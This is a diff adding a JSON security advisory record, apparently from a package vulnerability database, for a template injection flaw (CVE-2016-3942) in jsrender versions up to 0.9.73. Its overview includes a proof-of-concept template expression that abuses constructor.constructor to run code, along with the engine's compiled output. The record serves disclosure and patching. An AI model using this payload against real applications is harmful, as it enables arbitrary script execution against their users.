@@ -1,0 +1,21 @@
+{
+  "id": 97,
+  "created_at": "2016-03-30T22:22:15+00:00",
+  "updated_at": "2016-04-25T14:49:30+00:00",
+  "title": "Template Injection",
+  "author": "Paweł Hałdrzyński",
+  "module_name": "jsrender",
+  "publish_date": "2016-03-30T22:25:57+00:00",
+  "cves": [
+    "CVE-2016-3942"
+  ],
+  "vulnerable_versions": "<=0.9.73",
+  "patched_versions": ">=0.9.74",
+  "slug": "jsrender_template-injection",
+  "overview": "jsrender is a template engine for use within the browser or node.js.\n\nIf JsRender version 0.9.73 or earlier is used with server-delivered client-side templates that dynamically embed end-user input, then it is possible for a malicious user to execute arbitrary client-side code via use of a very specific expression. This threat has been removed in version 0.9.74 and all subsequent updates.\n\nThe finder of this vulnerability provided a proof of concept demonstrating code execution.\n```\n<POC-REQUEST>\n{{for ~x!=1?(constructor.constructor(\"return arguments.callee.caller\")()):~y(10)}}\n{{:#data}}\n{{/for}}\n</POC-REQUEST>\n```\n\n```\n<POC-RESPONSE>\nfunction anonymous(data,view,j,u) { // template var v,t=j._tag,ret=\"\" +t(\"for\",view,this,[ {view:view,tmpl:1, params:{args:['~x!=1?(constructor.constructor(\\\"return arguments.callee.caller\\\")()):~y(10)']}, args:[view.hlp(\"x\")!=1?(data.constructor.constructor(\"return arguments.callee.caller\")()):view.hlp(\"y\")(10)], props:{}}]); return ret; } \n<POC-RESPONSE>\n```",
+  "recommendation": "Upgrade to at least version 0.9.74",
+  "references": "https://github.com/BorisMoore/jsrender/commit/f984e139deb0a7648d5b543860ec652c21f6dcf6",
+  "cvss_vector": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L",
+  "cvss_score": 6.3,
+  "coordinating_vendor": "^Lift Security"
+}
